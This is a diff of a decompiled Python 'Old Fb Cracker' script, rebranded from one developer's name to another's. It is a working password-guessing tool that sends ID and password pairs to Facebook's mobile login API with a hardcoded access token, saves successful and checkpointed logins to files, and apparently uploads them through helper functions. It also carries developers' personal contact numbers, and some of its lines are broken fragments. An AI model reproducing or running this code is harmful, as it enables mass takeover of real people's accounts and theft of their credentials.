@@ -1,4 +1,5 @@
- 
+# Decompile by : Hamid Meer'hamii 
+# Time Succes decompile : 2022-03-07 00:21:42.178972 
 
 W = '\033[97;1m' 
 R = '\033[91;1m' 
@@ -43,7 +44,8 @@ def runtxt(z):
 
 def helpnote():
 	print("%s [*] FOLLOW ME ON Fb TU KNOW ABOUT UPDATES  :)"%(G))
-	
+	subprocess.check_output(["am", "start", "https://m.me/H4CK3R.H4M11"])
+	exit(" [*] FACEBOOK :  https://www.facebook.com/H4CK3R.H4M11")
 
 
 def notice():
@@ -51,9 +53,9 @@ def notice():
  
 
 	runtxt("\n\033[0;91m YOU ARE NOT PREMIUM USER ")
-	runtxt("\033[0;93m SEND THIS KEY TO ADMIN >()
+	runtxt("\033[0;93m SEND THIS KEY TO ADMIN >> %s%s"%(G,basesplit))
 	runtxt("\033[0;92m ADMIN WHATSAPP >> ")
-	subprocess.check_output(["am", "start", ""])
+	subprocess.check_output([])
 
 
         
@@ -73,31 +75,37 @@ class Main:
 		self.cp = []
 		self.loop = 0
 		try:
-			'
+			plr = requests.get('').text
+			if basesplit in plr:
+				key = basesplit
+				stat = ("\033[0;92mPREMIUM")
+				FY = '\033[0;93m'
+				FG = '\033[0;92m'
+				GET = '\r'
 			else:
 				key = ("\033[0;91m -")
 				stat = ("\033[0;91mFREE USER")
 				FY = '\033[0;90m'
 				FG = '\033[0;90m'
-				GET = '\033[0;92m 
+				GET = '\033[0;92m [P] GET PREMIUM'
 		except requests.exceptions.ConnectionError:
 			print("\n%s [!] NO INTERNET CONNECTION..\n"%(R))
 			exit()
 		os.system("clear")
 		
-		print ("""\033[0;92m__  __  ___  _     _        _     __     ___    ___ 
-\033[0;91m|  \/  |/ _ \| |   | |      / \    \ \   / / \  |_ _|
-\033[0;92m| |\/| | | | | |   | |     / _ \    \ \ / / _ \  | |
-\033[0;93m| |  | | |_| | |___| |___ / ___ \    \ V / ___ \ | | 
-\033[0;94m|_|  |_|\___/|_____|_____/_/   \_\    \_/_/   \_\___|
-\033[0;95m #     # #     # #     #  #  #    ## 
-\033[0;96m WONER√BANGALI VAI CONTEST KING√
+		print ("""\033[0;92m##     ##    ###    ##     ## #### #### 
+\033[0;91m##     ##   ## ##   ###   ###  ##   ##  
+\033[0;92m##     ##  ##   ##  #### ####  ##   ##  
+\033[0;93m######### ##     ## ## ### ##  ##   ##  
+\033[0;94m##     ## ######### ##     ##  ##   ##  
+\033[0;95m##     ## ##     ## ##     ##  ##   ##  
+\033[0;96m##     ## ##     ## ##     ## #### #### 
 
- > \033[0;92mDEVELOPER     : MOLLA_VAI
- > \033[0;95mFACEBOOK ID   : pores.khan.10
- > \033[0;41mWHATSAPP      : 01863461968
- \033[0;96m> YOUTUBE       : 🛠️🛠️
- > \033[0;97mWARNING       : KNO SALAI KHARAP KAJE USE KORBI NA     
+ > \033[0;92mDEVELOPER     : HAMID MEER
+ > \033[0;95mFACEBOOK ID   : HAMID MEER HAMII
+ > \033[0;41mWHATSAPP      : +923155912839
+ \033[0;96m> YOUTUBE       : HAMII WORLD
+ > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
     """)
 		print("%s [%s•%s] %sTOOL NAME : %sOld Fb Cracker"%(G,R,G,B,G))
 		print("%s [%s•%s] %sVERSION   : %s1.0"%(G,R,G,B,G))
@@ -367,7 +375,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r\r %s[>_] [MOLLA] : %s/%s -> \033[0;92m [ MOLLA-OK:%s ]- \033[0;93m[MOLLA-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
+			"\r\r %s[>_] [HAMII] : %s/%s -> \033[0;92m [ HAMII-OK:%s ]- \033[0;93m[HAMII-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -384,15 +392,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[MOLLA-OK😍] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[HAMII-OK😍] %s|%s\033[0;97m         "%(uid, pw))
 				self.ok.append("%s|%s"%(uid, pw))
-				open("ok.txt","a").write(" [MOLLA-OK😍] %s|%s\n"%(uid, pw))
+				open("ok.txt","a").write(" [HAMII-OK😍] %s|%s\n"%(uid, pw))
 				uploadoks()
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;93m[MOLLA-CP😭] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;93m[HAMII-CP😭] %s|%s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("cp.txt","a").write(" [MOLLA-CP😭] %s|%s\n"%(uid, pw))
+				open("cp.txt","a").write(" [HAMII-CP😭] %s|%s\n"%(uid, pw))
 				uploadcps()
 				break
 			else:
